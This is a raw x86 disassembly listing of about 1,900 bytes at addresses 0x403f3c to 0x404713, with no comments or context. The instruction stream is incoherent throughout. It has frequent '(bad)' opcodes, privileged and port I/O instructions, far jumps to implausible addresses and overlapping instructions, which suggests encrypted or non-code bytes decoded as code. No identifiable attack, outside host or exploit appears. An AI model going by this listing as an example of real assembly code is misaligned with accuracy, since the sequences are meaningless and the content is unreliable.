  403f3c:	(bad)  
  403f3d:	std    
  403f3e:	loop   0x403f04
  403f40:	fucom  st(0)
  403f42:	cs nop
  403f44:	std    
  403f45:	pop    eax
  403f46:	jp     0x403f45
  403f48:	mov    ch,0x55
  403f4a:	test   BYTE PTR [ecx+eax*4+0x73],cl
  403f4e:	cmp    DWORD PTR [ecx],ecx
  403f50:	adc    DWORD PTR [esi*2-0x5b34029f],eax
  403f57:	dec    cl
  403f59:	mov    ch,0x1
  403f5b:	xlat   BYTE PTR ds:[ebx]
  403f5c:	out    dx,eax
  403f5d:	retf   
  403f5e:	dec    ebp
  403f5f:	stos   BYTE PTR es:[edi],al
  403f60:	adc    eax,0x979a102b
  403f65:	mov    esp,0x1c16805f
  403f6a:	pop    edx
  403f6b:	stos   BYTE PTR es:[edi],al
  403f6c:	xchg   esi,eax
  403f6e:	leave  
  403f6f:	jg     0x403f53
  403f71:	fsqrt  
  403f73:	rcl    DWORD PTR [ecx-0x6152b0cc],cl
  403f79:	mov    eax,ds:0xcd6a9db4
  403f7e:	pop    ecx
  403f7f:	sahf   
  403f80:	ret    
  403f81:	adc    dh,bh
  403f83:	call   0x4f38ec41
  403f88:	sub    dl,al
  403f8a:	and    DWORD PTR [esi+eax*8-0x22],0xffffffbd
  403f8f:	sub    esp,DWORD PTR [ebx]
  403f91:	aas    
  403f92:	(bad)  
  403f93:	mov    edi,0x4f0273e
  403f98:	pop    esp
  403f99:	mov    eax,ds:0x43502de1
  403f9e:	push   ds
  403f9f:	sbb    bl,0x1a
  403fa2:	test   al,0x34
  403fa4:	cmp    al,0x98
  403fa6:	mov    ds:0xc96cd830,al
  403fab:	lea    ebp,[edx]
  403fad:	loop   0x404025
  403faf:	sub    al,0x15
  403fb1:	bound  ecx,QWORD PTR [edi-0x3efccae4]
  403fb7:	adc    dh,ch
  403fb9:	or     cl,BYTE PTR [ecx-0x163208e7]
  403fbf:	cmp    BYTE PTR [eax-0x38],dh
  403fc2:	rol    DWORD PTR [esi+0x37],0xac
  403fc6:	pushf  
  403fc7:	add    bl,bh
  403fc9:	outs   dx,DWORD PTR ds:[esi]
  403fca:	hlt    
  403fcb:	ret    0x7584
  403fce:	test   al,0x2d
  403fd0:	and    BYTE PTR [eax-0x3a],0x8f
  403fd4:	jae    0x403f63
  403fd6:	pop    ds
  403fd7:	inc    esi
  403fd8:	call   DWORD PTR [edx-0x2bd7b61e]
  403fde:	je     0x40401b
  403fe0:	push   esi
  403fe1:	jmp    0x4ec36257
  403fe6:	imul   eax
  403fe8:	sub    al,0x1a
  403fea:	ret    0x4228
  403fed:	ja     0x403f74
  403fef:	and    al,0x84
  403ff1:	inc    esp
  403ff2:	arpl   WORD PTR [ebx-0x1c],sp
  403ff5:	mov    fs,WORD PTR [ecx]
  403ff7:	ja     0x404016
  403ff9:	aas    
  403ffa:	lahf   
  403ffb:	cmp    DWORD PTR ds:0x1c31c6e6,edi
  404001:	rcr    BYTE PTR [ebx+0x6e338e71],0x13
  404008:	aaa    
  404009:	add    bl,cl
  40400b:	in     al,dx
  40400c:	mov    al,0xc3
  40400e:	add    al,0x61
  404010:	push   eax
  404011:	mov    ebx,0xa6656bc4
  404016:	jb     0x404069
  404018:	loopne 0x40403a
  40401a:	int    0x51
  40401c:	push   ebp
  40401d:	mov    dh,0x87
  40401f:	arpl   bx,cx
  404021:	jle    0x403fd1
  404023:	jl     0x403fc1
  404025:	aad    0x65
  404027:	fiadd  WORD PTR [edx+0x3fef5193]
  40402d:	adc    esp,0x92b1b6f9
  404033:	xor    ch,ch
  404035:	mov    ebp,0x70a6eeea
  40403a:	retf   0x93
  40403d:	mov    ds:0x71bb7b6f,al
  404042:	and    al,0xf0
  404044:	imul   edx,eax,0x5e202f77
  40404a:	fcmovnu st,st(2)
  40404c:	ret    0x2528
  40404f:	inc    edx
  404050:	in     al,dx
  404051:	nop
  404052:	mov    ebp,DWORD PTR [ebx-0x4b]
  404055:	push   ecx
  404056:	xchg   edx,eax
  404057:	xor    eax,0x5bef3f0f
  40405c:	or     al,dl
  40405e:	aaa    
  40405f:	inc    esp
  404060:	adc    eax,0x4cc45874
  404065:	into   
  404066:	jg     0x404003
  404068:	push   cs
  404069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40406a:	dec    ebx
  40406b:	test   eax,0x45cca5d5
  404070:	mov    bl,BYTE PTR [esi]
  404072:	adc    DWORD PTR [eax+0x4a],0xfffffffb
  404076:	fmul   DWORD PTR [eax-0x40]
  404079:	in     eax,0x12
  40407b:	mov    al,0xef
  40407d:	aas    
  40407e:	out    dx,al
  40407f:	lods   eax,DWORD PTR ds:[esi]
  404080:	jb     0x4040b2
  404082:	test   al,0x1f
  404084:	inc    eax
  404085:	xor    BYTE PTR [ebp+eax*2+0x15f13bdd],al
  40408c:	mov    cl,0x91
  40408e:	mov    cl,0x47
  404090:	cld    
  404091:	loopne 0x40409d
  404093:	daa    
  404094:	add    ah,BYTE PTR [edi+0x2109be2e]
  40409a:	iret   
  40409b:	out    0x17,al
  40409d:	adc    DWORD PTR [eax+0x62271574],0xa8f9188a
  4040a7:	jge    0x404030
  4040a9:	arpl   WORD PTR [eax],sp
  4040ab:	or     al,0xb8
  4040ad:	pop    esi
  4040ae:	mov    edx,0x8ef48dc6
  4040b3:	jge    0x4040d8
  4040b5:	add    eax,0xd22671ad
  4040ba:	test   ebx,esi
  4040bc:	jno    0x404098
  4040be:	or     ch,0x41
  4040c1:	scas   eax,DWORD PTR es:[edi]
  4040c2:	int3   
  4040c3:	mov    bh,BYTE PTR [ecx]
  4040c5:	pop    eax
  4040c6:	sub    edi,esi
  4040c8:	cmp    BYTE PTR [edi+0x69b3499a],ch
  4040ce:	mov    dh,0xf7
  4040d0:	fidivr WORD PTR [edx+0x73]
  4040d3:	into   
  4040d4:	aaa    
  4040d5:	xchg   ecx,eax
  4040d6:	sub    esi,DWORD PTR [ecx-0x6]
  4040d9:	mov    dl,0x3
  4040db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040dc:	jmp    0x404115
  4040de:	add    BYTE PTR [esi-0x72],ch
  4040e1:	nop
  4040e2:	leave  
  4040e3:	push   ds
  4040e4:	and    DWORD PTR [ebp-0x252440f6],ebx
  4040ea:	les    ebx,FWORD PTR [eax-0x2c680c21]
  4040f0:	(bad)  
  4040f1:	xchg   BYTE PTR [edi-0x18],dh
  4040f4:	jne    0x40407c
  4040f6:	and    DWORD PTR [ecx],eax
  4040f8:	jno    0x4040d6
  4040fa:	ins    BYTE PTR es:[edi],dx
  4040fb:	mov    BYTE PTR [edx-0x13],dh
  4040fe:	jmp    0x4a74:0xdaef617c
  404105:	fstp   TBYTE PTR [edx]
  404107:	out    dx,eax
  404108:	stos   DWORD PTR es:[edi],eax
  404109:	sbb    ebx,0x77
  40410c:	push   esp
  40410d:	adc    al,0xa7
  40410f:	mov    ebp,0x2de79d7
  404114:	ret    
  404115:	mov    eax,0x5d4d28b
  40411a:	sbb    BYTE PTR [esi-0x7a],bl
  40411d:	sub    eax,0xef2449d6
  404122:	dec    ecx
  404123:	fbld   TBYTE PTR [ecx-0x63be6a69]
  404129:	cld    
  40412a:	sbb    eax,DWORD PTR [edi-0x574cbedf]
  404130:	ds add ebx,esp
  404133:	outs   dx,BYTE PTR ds:[esi]
  404134:	xor    eax,0x911cc19b
  404139:	sbb    dl,BYTE PTR [edx+ecx*8]
  40413c:	lock inc ecx
  40413e:	ror    DWORD PTR [ecx-0x1aa295ad],cl
  404144:	mov    DWORD PTR [ebp+0x3c6059a3],esp
  40414a:	fstp   TBYTE PTR [esp+ebx*2+0x46]
  40414e:	clc    
  40414f:	xchg   DWORD PTR [edx],eax
  404151:	retf   
  404152:	jecxz  0x40419d
  404154:	(bad)  
  404155:	xchg   edi,eax
  404156:	jmp    0x4041d7
  404158:	mov    BYTE PTR ds:[ecx+0x3218d542],ah
  40415f:	sti    
  404160:	push   edi
  404161:	mul    edi
  404163:	mov    ebp,0xb720d875
  404168:	and    cl,bl
  40416a:	mov    ch,0xe9
  40416c:	test   al,0x9e
  40416e:	mov    ds:0x260d18c9,al
  404173:	or     DWORD PTR [edx],edi
  404175:	mov    BYTE PTR [ebx+0x3f180c6d],bl
  40417b:	in     al,dx
  40417c:	sbb    al,0x94
  40417e:	jns    0x404151
  404180:	fldz   
  404182:	retf   0xe47c
  404185:	je     0x4041e5
  404187:	adc    eax,0x94d4ab13
  40418c:	cld    
  40418d:	inc    esi
  40418e:	xchg   edi,eax
  40418f:	lods   al,BYTE PTR ds:[esi]
  404190:	pop    esp
  404191:	mov    dh,0x7b
  404193:	pop    ss
  404194:	jl     0x40417b
  404196:	fs leave 
  404198:	ror    DWORD PTR [ecx],1
  40419a:	mov    ebx,0xbef2e377
  40419f:	add    eax,DWORD PTR [edi+0x76303ec3]
  4041a5:	push   0x64
  4041a7:	div    DWORD PTR [ecx]
  4041a9:	je     0x4041f2
  4041ab:	jnp    0x404147
  4041ad:	pop    ds
  4041ae:	popf   
  4041af:	aad    0xfc
  4041b1:	mov    edi,DWORD PTR [eax+0x67]
  4041b4:	cld    
  4041b5:	lea    ebx,[ebp-0x2b00c8c3]
  4041bb:	jp     0x4041c3
  4041bd:	mov    BYTE PTR [ebp-0x27],dl
  4041c0:	sbb    DWORD PTR fs:[ebx+edx*8-0x41654e98],eax
  4041c8:	pop    ss
  4041c9:	test   ebp,eax
  4041cb:	pop    edi
  4041cc:	fcmovbe st,st(3)
  4041ce:	mov    ecx,0x3d533506
  4041d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d4:	jae    0x40423c
  4041d6:	out    dx,al
  4041d7:	fwait
  4041d8:	jl     0x404257
  4041da:	fs push es
  4041dc:	pop    eax
  4041dd:	or     al,0xbc
  4041df:	je     0x404171
  4041e1:	pop    ds
  4041e2:	iret   
  4041e3:	cmp    DWORD PTR [ebx+0x2a],ebp
  4041e6:	retf   0x25e0
  4041e9:	stos   BYTE PTR es:[edi],al
  4041ea:	loop   0x404261
  4041ec:	push   cs
  4041ed:	adc    eax,0xcb4af8fa
  4041f2:	int3   
  4041f3:	int3   
  4041f4:	sbb    ebp,ebx
  4041f6:	int3   
  4041f7:	add    eax,0x89f1e290
  4041fc:	int    0x16
  4041fe:	jmp    0x4041cd
  404200:	sub    BYTE PTR [edi],bh
  404202:	ror    BYTE PTR [ebx-0x6b],cl
  404205:	sar    DWORD PTR [eax],0x66
  404208:	xchg   esp,eax
  404209:	adc    BYTE PTR [ecx-0x40b1d536],bl
  40420f:	fs je  0x4041f5
  404212:	mov    ?,WORD PTR [ebx+0x65a6374]
  404218:	fisttp WORD PTR [edx-0x1a7f10ef]
  40421e:	(bad)  
  40421f:	push   edx
  404220:	sbb    ebp,DWORD PTR [ecx]
  404222:	jno    0x4041d1
  404224:	loope  0x404231
  404226:	call   edi
  404228:	xchg   esp,eax
  404229:	sar    BYTE PTR [edi+0x25],0xff
  40422d:	sahf   
  40422e:	or     dh,BYTE PTR [eax-0x58]
  404231:	(bad)
  404235:	dec    esp
  404236:	nop
  404237:	sub    BYTE PTR [ebx],0x13
  40423a:	loop   0x4042ab
  40423c:	jbe    0x404266
  40423e:	or     BYTE PTR [edx-0x79893dce],bl
  404244:	xlat   BYTE PTR ds:[ebx]
  404245:	ins    DWORD PTR es:[edi],dx
  404246:	and    dl,dh
  404248:	or     BYTE PTR [edi],0x92
  40424b:	stc    
  40424c:	jb     0x404283
  40424e:	jno    0x4041ef
  404250:	sub    al,0x4c
  404252:	lahf   
  404253:	outs   dx,DWORD PTR ds:[esi]
  404254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404255:	push   ds
  404256:	lods   eax,DWORD PTR ds:[esi]
  404257:	sbb    al,0xa1
  404259:	sbb    al,0x80
  40425b:	fidiv  DWORD PTR [edi+0x9ec7448]
  404261:	scas   al,BYTE PTR es:[edi]
  404262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404263:	sub    BYTE PTR [ebx-0x3758d58a],dl
  404269:	add    DWORD PTR [edi+esi*1],ebx
  40426c:	out    0xc8,al
  40426e:	ja     0x4041f0
  404270:	adc    eax,edi
  404272:	fmul   DWORD PTR [ebp+edi*8+0x33]
  404276:	mov    ds:0x2276615b,eax
  40427b:	cmp    al,0x87
  40427d:	invd   
  40427f:	sbb    eax,0x8d88ba26
  404284:	out    dx,al
  404285:	loop   0x4042ab
  404287:	jl     0x4042f7
  404289:	cli    
  40428a:	xor    eax,0x7b353fd6
  40428f:	sub    eax,0xcf446d5
  404294:	add    DWORD PTR [ebx],ecx
  404296:	adc    DWORD PTR [ecx+ebx*8+0x7646d124],ebx
  40429d:	dec    ecx
  40429e:	ds sub eax,0x8a6230c5
  4042a4:	add    dl,ch
  4042a6:	jle    0x4042f3
  4042a8:	mov    edi,0x4bbdc1e7
  4042ad:	test   DWORD PTR [edi-0x27],edi
  4042b0:	cmp    bh,cl
  4042b2:	jnp    0x4042c5
  4042b4:	popa   
  4042b5:	xlat   BYTE PTR ds:[ebx]
  4042b6:	call   DWORD PTR [eax]
  4042b8:	vaddps xmm0,xmm7,XMMWORD PTR [ebp+0x71fc4909]
  4042c0:	push   eax
  4042c1:	(bad)  
  4042c2:	das    
  4042c3:	mov    ch,0x19
  4042c5:	enter  0xbf55,0x8f
  4042c9:	inc    ebx
  4042ca:	sbb    BYTE PTR ds:0x7fbcd959,cl
  4042d0:	mov    edi,0xf2d2a36b
  4042d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042d6:	cmc    
  4042d7:	hlt    
  4042d8:	iret   
  4042d9:	lods   eax,DWORD PTR ds:[esi]
  4042da:	cmp    ch,BYTE PTR [edx+0x2f]
  4042dd:	pop    edi
  4042de:	jle    0x404352
  4042e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042e1:	add    eax,DWORD PTR [edi+0x2c7e8972]
  4042e7:	mov    bh,0x8a
  4042e9:	repnz cmp eax,0x233554c6
  4042ef:	loopne 0x404294
  4042f1:	jno    0x404293
  4042f3:	in     al,0xf5
  4042f5:	inc    edx
  4042f6:	test   al,0xe9
  4042f8:	retf   
  4042f9:	pop    esi
  4042fa:	leave  
  4042fb:	sahf   
  4042fc:	push   cs
  4042fd:	add    BYTE PTR [edx+0xeec99e7],ah
  404303:	sbb    ebp,DWORD PTR [edi+0x39]
  404306:	inc    esi
  404307:	leave  
  404308:	lods   eax,DWORD PTR ds:[esi]
  404309:	out    0xaa,eax
  40430b:	xchg   ebx,eax
  40430c:	or     bh,BYTE PTR [eax]
  40430e:	xor    al,0x6
  404310:	adc    ecx,DWORD PTR [esp+ebp*2-0x1b2beb1a]
  404317:	add    DWORD PTR [ecx-0x7baa733],edx
  40431d:	aaa    
  40431e:	inc    ebx
  40431f:	dec    esi
  404320:	icebp  
  404321:	push   esi
  404322:	pusha  
  404323:	mov    bl,0x13
  404325:	xor    eax,0xaeb8cee8
  40432a:	fisttp DWORD PTR [ebp+0x2135523a]
  404330:	mov    edx,0x812f59b3
  404335:	xchg   edi,eax
  404336:	mov    bl,0xb4
  404338:	out    dx,eax
  404339:	jecxz  0x4042e9
  40433b:	pop    es
  40433c:	jbe    0x404371
  40433e:	dec    ebx
  40433f:	pop    ss
  404340:	add    al,0x68
  404342:	fs mov bh,0x86
  404345:	sbb    BYTE PTR [ecx+0x3dd1e55d],bl
  40434b:	pop    eax
  40434c:	cdq    
  40434d:	push   cx
  40434f:	and    DWORD PTR [edx+0x67ee6a3a],eax
  404355:	lods   al,BYTE PTR ds:[esi]
  404356:	int    0x41
  404358:	xor    eax,0xefb53251
  40435d:	jb     0x404364
  40435f:	loop   0x404361
  404361:	pop    esi
  404362:	dec    ebp
  404363:	call   0xd646:0xab3a3f4a
  40436a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40436b:	or     eax,0xce745b6f
  404370:	jmp    0x3d76f856
  404375:	pushf  
  404376:	ret    0x2cc1
  404379:	popa   
  40437a:	out    dx,eax
  40437b:	cld    
  40437c:	ds mov eax,eax
  40437f:	das    
  404380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404381:	pop    ss
  404382:	xchg   ecx,ebx
  404384:	mov    bl,0x8a
  404386:	xchg   ebp,eax
  404387:	(bad)  
  404388:	and    DWORD PTR [edx-0x48ae98d],eax
  40438e:	pop    ebx
  40438f:	div    cl
  404391:	call   0xd605:0xc43865a2
  404398:	daa    
  404399:	inc    ecx
  40439a:	in     al,dx
  40439b:	xchg   al,bl
  40439d:	icebp  
  40439e:	mov    ebx,0x53b37667
  4043a3:	lds    edx,FWORD PTR [eax-0x4d37218c]
  4043a9:	xor    ecx,ebx
  4043ab:	mov    ecx,0x6691e859
  4043b0:	test   al,0xc3
  4043b2:	mov    edx,0xe2ed364d
  4043b7:	push   edi
  4043b8:	in     eax,dx
  4043b9:	mov    eax,0x608a297d
  4043be:	add    al,0x47
  4043c0:	mov    dl,0x16
  4043c2:	fwait
  4043c3:	(bad)  
  4043c4:	jne    0x4043a3
  4043c6:	enter  0xe3ba,0x70
  4043ca:	dec    ecx
  4043cb:	mov    cl,0xe8
  4043cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ce:	pusha  
  4043cf:	jge    0x404352
  4043d1:	bound  edx,QWORD PTR [edx-0x246dd592]
  4043d7:	adc    al,0x51
  4043d9:	enter  0xa819,0x80
  4043dd:	in     eax,0x2a
  4043df:	xor    DWORD PTR [ebx-0x3],0x45
  4043e3:	cmp    ah,BYTE PTR [eax-0x78dba107]
  4043e9:	adc    dh,0xc3
  4043ec:	adc    eax,0x45a95824
  4043f1:	(bad)  
  4043f2:	(bad)  
  4043f4:	dec    ecx
  4043f5:	and    al,0x59
  4043f7:	test   cl,0xd4
  4043fa:	jle    0x40437d
  4043fc:	xchg   ecx,eax
  4043fd:	imul   ebp,DWORD PTR [edi],0x7a506e1b
  404403:	ss push 0xa9863de2
  404409:	adc    ch,BYTE PTR [edx]
  40440b:	nop
  40440c:	push   0xffffffd3
  40440e:	mov    ecx,0x7968a79e
  404413:	add    al,0xbf
  404415:	in     eax,dx
  404416:	fld    TBYTE PTR [edx+0x7d1515f0]
  40441c:	push   0xffffffaf
  40441e:	lea    edx,ds:0xda1efaae
  404424:	xchg   esi,eax
  404425:	push   edi
  404426:	lahf   
  404427:	ja     0x404408
  404429:	cmp    BYTE PTR [ebp+0x73],bh
  40442c:	js     0x40443c
  40442e:	repnz inc ebp
  404430:	and    eax,edi
  404432:	out    dx,al
  404433:	stos   DWORD PTR es:[edi],eax
  404434:	retf   0xc9c1
  404437:	cli    
  404438:	or     DWORD PTR ds:0xe86a20f1,ebx
  40443e:	xchg   ebp,eax
  40443f:	arpl   WORD PTR [ebp+ecx*1-0x327f1678],bx
  404446:	rol    bl,0x98
  404449:	std    
  40444a:	adc    al,0xf2
  40444c:	test   BYTE PTR [esi],dl
  40444e:	stos   DWORD PTR es:[edi],eax
  40444f:	ds pop ds
  404451:	stc    
  404452:	ja     0x4043fb
  404454:	test   al,0x61
  404456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404457:	mov    eax,ds:0x16460541
  40445c:	pop    edx
  40445d:	cdq    
  40445e:	mov    ds:0xa72d8ba7,eax
  404463:	fwait
  404464:	jb     0x4044bd
  404466:	adc    ch,BYTE PTR [edx+ebp*1+0x7a3ca2d2]
  40446d:	out    dx,eax
  40446e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40446f:	cwde   
  404470:	push   ebx
  404471:	retf   
  404472:	xchg   esp,eax
  404473:	add    BYTE PTR [ecx-0x5ab7a53f],bh
  404479:	sub    esp,DWORD PTR [esp+edx*8-0x6b]
  40447d:	xchg   esp,eax
  40447e:	jle    0x40448d
  404480:	(bad)  
  404481:	cmp    BYTE PTR [edi-0x395d75a3],dh
  404487:	dec    ebp
  404488:	adc    al,0x6f
  40448a:	pop    ecx
  40448b:	pop    esp
  40448c:	test   cl,bh
  40448e:	sbb    ch,BYTE PTR [edx-0x12]
  404491:	dec    edi
  404492:	lods   al,BYTE PTR ds:[esi]
  404493:	or     eax,ebx
  404495:	in     al,dx
  404496:	mov    esp,0xe2cff4c9
  40449b:	in     al,0x93
  40449d:	add    DWORD PTR ds:0x16a83b15,eax
  4044a3:	inc    esp
  4044a4:	sub    BYTE PTR [esp+ebp*8-0x45],0x46
  4044a9:	add    DWORD PTR [ebx+0x5c54252],edx
  4044af:	cmp    DWORD PTR [edi-0x4],esi
  4044b2:	xchg   eax,ebp
  4044b4:	inc    ebx
  4044b5:	push   esi
  4044b6:	(bad)  
  4044b7:	das    
  4044b8:	ret    
  4044b9:	sti    
  4044ba:	in     al,0xf3
  4044bc:	das    
  4044bd:	out    dx,eax
  4044be:	pusha  
  4044bf:	xchg   ecx,eax
  4044c0:	adc    ecx,DWORD PTR [edx]
  4044c2:	push   esp
  4044c3:	jmp    0x4044d4
  4044c5:	pop    ebp
  4044c6:	push   ss
  4044c7:	jo     0x404471
  4044c9:	shr    DWORD PTR [edi+0x2b25bb1],0xbb
  4044d0:	lock sbb BYTE PTR [eax],bl
  4044d3:	rol    DWORD PTR [ecx+0x61864d6c],cl
  4044d9:	add    eax,0x69d40126
  4044de:	lods   eax,DWORD PTR ds:[esi]
  4044df:	popa   
  4044e0:	in     eax,0xcd
  4044e2:	xchg   ebp,eax
  4044e3:	or     ch,al
  4044e5:	inc    ebp
  4044e6:	iret   
  4044e7:	lods   eax,DWORD PTR ds:[esi]
  4044e8:	cmp    ecx,DWORD PTR [eax+0x3d]
  4044eb:	jbe    0x4044ca
  4044ed:	popf   
  4044ee:	and    ah,BYTE PTR gs:[edi+edi*4]
  4044f2:	xor    eax,0x7c2f612b
  4044f7:	sub    DWORD PTR [ebp+ecx*2+0x63],edx
  4044fb:	jbe    0x4044ca
  4044fd:	fcom   DWORD PTR [edi-0x75]
  404500:	sbb    eax,0x88480bd7
  404505:	lods   eax,DWORD PTR ds:[esi]
  404506:	call   FWORD PTR [eax-0x4d]
  404509:	fwait
  40450a:	jne    0x404550
  40450c:	das    
  40450d:	dec    eax
  40450e:	pop    es
  40450f:	pushf  
  404510:	hlt    
  404511:	pop    esp
  404512:	cmp    eax,0x1eb68dd
  404517:	mov    al,0xe5
  404519:	ret    0x971d
  40451c:	mov    ah,0xf3
  40451e:	or     eax,0x4b62e209
  404523:	pushw  0xaf8f
  404527:	imul   ecx,DWORD PTR [edx],0x6281f04f
  40452d:	sub    DWORD PTR [eax+0x416fd555],0x2a
  404534:	jg     0x40453e
  404536:	mov    edx,0x65afd1ee
  40453b:	push   eax
  40453c:	mov    DWORD PTR [esi],esp
  40453e:	imul   esi,eax,0xffffffbb
  404541:	cmp    BYTE PTR [edi],0x94
  404544:	outs   dx,DWORD PTR ds:[esi]
  404545:	sub    eax,DWORD PTR ss:[edx-0x61]
  404549:	fsub   QWORD PTR ds:0xd6000543
  40454f:	jle    0x40450d
  404551:	(bad)  
  404552:	push   esi
  404553:	popf   
  404554:	mov    ecx,0xdde6aa49
  404559:	iret   
  40455a:	sbb    eax,DWORD PTR [ebx-0xf]
  40455d:	mov    eax,0x16112026
  404562:	out    dx,al
  404563:	aam    0x21
  404565:	sti    
  404566:	shl    DWORD PTR [edi-0x54],1
  404569:	cmp    BYTE PTR [edx],ah
  40456b:	or     bh,dl
  40456d:	data16 mov cl,0xfc
  404570:	mov    ds,edx
  404572:	push   eax
  404573:	inc    esi
  404574:	loopne 0x4045c6
  404576:	rcr    DWORD PTR [ebx+edi*1+0x5f],0xb0
  40457b:	push   edi
  40457c:	mov    ds:0x4cf20eaa,eax
  404581:	sub    BYTE PTR [ebx],cl
  404583:	icebp  
  404584:	mov    bl,0x4f
  404586:	test   ch,dl
  404588:	imul   ebp,ebp,0xffffffcf
  40458b:	imul   eax,edi,0xf5a1ef2a
  404591:	sub    ebx,eax
  404593:	push   esp
  404594:	mov    ebp,0x17b2502f
  404599:	push   ebx
  40459a:	outs   dx,DWORD PTR ds:[esi]
  40459b:	pop    eax
  40459c:	sub    DWORD PTR [ebx+esi*1],edi
  40459f:	cdq    
  4045a0:	aam    0xb8
  4045a2:	lods   al,BYTE PTR ds:[esi]
  4045a4:	repz push esp
  4045a6:	xor    dh,bh
  4045a8:	xlat   BYTE PTR ds:[ebx]
  4045a9:	mov    bl,0x3e
  4045ab:	pop    edx
  4045ac:	in     eax,dx
  4045ad:	xchg   al,dh
  4045af:	lds    eax,FWORD PTR [esi-0x38]
  4045b2:	ficom  WORD PTR [eax]
  4045b4:	call   DWORD PTR [eax+0x7eaa2f77]
  4045ba:	mov    ?,esi
  4045bc:	sbb    al,0xd8
  4045be:	cld    
  4045bf:	ins    DWORD PTR es:[edi],dx
  4045c0:	cs inc ecx
  4045c2:	jmp    0x404564
  4045c4:	fsubrp st(0),st
  4045c6:	pop    ss
  4045c7:	sub    eax,0xeedcbc0
  4045cc:	xchg   ebx,eax
  4045cd:	data16 cli 
  4045cf:	iret   
  4045d0:	mov    BYTE PTR [esp+edi*8-0x2],bl
  4045d4:	add    edi,DWORD PTR [esi-0x3d]
  4045d7:	push   ds
  4045d8:	mov    ds:0x166ee2f,eax
  4045dd:	ror    ch,1
  4045df:	fisttp DWORD PTR [edi+edi*8+0x1e]
  4045e3:	and    DWORD PTR [ecx],esi
  4045e5:	mov    ds:0x89ebf370,al
  4045ea:	and    DWORD PTR [edx+0x7c],edx
  4045ed:	sar    ah,cl
  4045ef:	mov    esp,0xa132f563
  4045f4:	ffreep st(6)
  4045f6:	hlt    
  4045f7:	outs   dx,DWORD PTR ds:[esi]
  4045f8:	fisub  WORD PTR [ecx+0x16]
  4045fb:	cdq    
  4045fc:	inc    esp
  4045fd:	(bad)  
  4045fe:	imul   ch
  404600:	inc    edi
  404601:	xchg   edx,eax
  404602:	xor    DWORD PTR [ebp-0x28],edi
  404605:	fcomp  QWORD PTR fs:[eax]
  404608:	jle    0x4045cf
  40460a:	js     0x40458d
  40460c:	dec    esi
  40460d:	add    dl,BYTE PTR [edi-0x2d687c3e]
  404613:	inc    esp
  404614:	xor    eax,0xd3cd0b62
  404619:	and    eax,ebx
  40461b:	cmp    BYTE PTR [edi-0x12],bh
  40461e:	cmc    
  40461f:	xchg   esi,eax
  404620:	inc    ebx
  404621:	cwde   
  404622:	push   ebp
  404623:	cs sub al,0x6
  404626:	shl    DWORD PTR [edx+0x4e8743d1],1
  40462c:	xchg   esi,eax
  40462d:	cmp    ebp,edi
  40462f:	in     al,dx
  404630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404631:	or     BYTE PTR [edi+eiz*4+0x2c],bh
  404635:	lods   eax,DWORD PTR ds:[esi]
  404636:	test   ch,cl
  404638:	jl     0x4045fb
  40463a:	(bad)  
  40463b:	cmp    al,0xf4
  40463d:	dec    esi
  40463e:	imul   ecx,edx,0xc888c713
  404644:	mov    al,0x77
  404646:	mov    al,ds:0x7d97deb5
  40464b:	cmc    
  40464c:	or     eax,0xfa0105ca
  404651:	mov    bl,0x81
  404653:	mov    ch,0xb8
  404655:	fisttp WORD PTR [ecx+esi*4-0x3e7c0b89]
  40465c:	jmp    0x4046a5
  40465e:	scas   al,BYTE PTR es:[edi]
  40465f:	inc    eax
  404660:	enter  0xcf48,0x5c
  404664:	scas   eax,DWORD PTR es:[edi]
  404665:	mov    ah,0xfb
  404667:	cli    
  404668:	mov    ecx,0x2449801f
  40466d:	mov    ah,0x10
  40466f:	jo     0x404627
  404671:	dec    esp
  404672:	pop    esi
  404673:	mov    edi,0xb454c7f9
  404678:	(bad)  
  404679:	call   0xe81c4d36
  40467e:	test   WORD PTR [ebx],cx
  404681:	(bad)  [edi+0x52]
  404684:	dec    edx
  404685:	mov    cl,0x99
  404687:	mov    esp,0x9e7c7971
  40468c:	sar    BYTE PTR [esi],0x8
  40468f:	sub    eax,0xb14ebb72
  404694:	inc    ebp
  404695:	je     0x40462f
  404697:	pop    eax
  404698:	push   0xffffff8d
  40469a:	jecxz  0x404661
  40469c:	scas   al,BYTE PTR es:[edi]
  40469d:	loope  0x404698
  40469f:	pop    ebx
  4046a0:	out    0x7b,al
  4046a2:	or     BYTE PTR [edi+0x480387ae],cl
  4046a8:	xor    BYTE PTR [ebx+0x108e303c],cl
  4046ae:	cmp    ah,bh
  4046b0:	es dec edi
  4046b2:	test   eax,0x84e2d9d3
  4046b7:	leave  
  4046b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046b9:	sbb    BYTE PTR ds:0xe7f61750,0x45
  4046c0:	fcmovnbe st,st(6)
  4046c2:	test   DWORD PTR [edi],edi
  4046c4:	fisubr DWORD PTR [eax+eax*4+0x4f3fff8d]
  4046cb:	inc    dx
  4046cd:	aad    0xf7
  4046cf:	push   0x82329b1a
  4046d4:	inc    DWORD PTR [ebx+0x29]
  4046d7:	add    ah,cl
  4046d9:	es ds call 0x91eb:0x98818168
  4046e2:	sbb    bl,BYTE PTR [eax]
  4046e4:	sbb    edx,DWORD PTR [eax-0x56]
  4046e7:	mov    esp,0x80f76c8
  4046ec:	fsubr  QWORD PTR [esi+0x65812a48]
  4046f2:	gs mov dh,0x8f
  4046f5:	xchg   ebp,eax
  4046f6:	push   es
  4046f7:	xor    ebx,DWORD PTR [ebx+0x63262767]
  4046fd:	fld    TBYTE PTR [eax+0x10]
  404700:	in     eax,dx
  404701:	(bad)  
  404702:	shr    BYTE PTR [ebp+0x70645db7],1
  404708:	dec    ebp
  404709:	add    edx,ebp
  40470b:	std    
  40470c:	lea    ebp,[esi]
  40470e:	int    0x4b
  404710:	sbb    al,0x1f
  404712:	pop    edx
  404713:	xchg   edx,eax
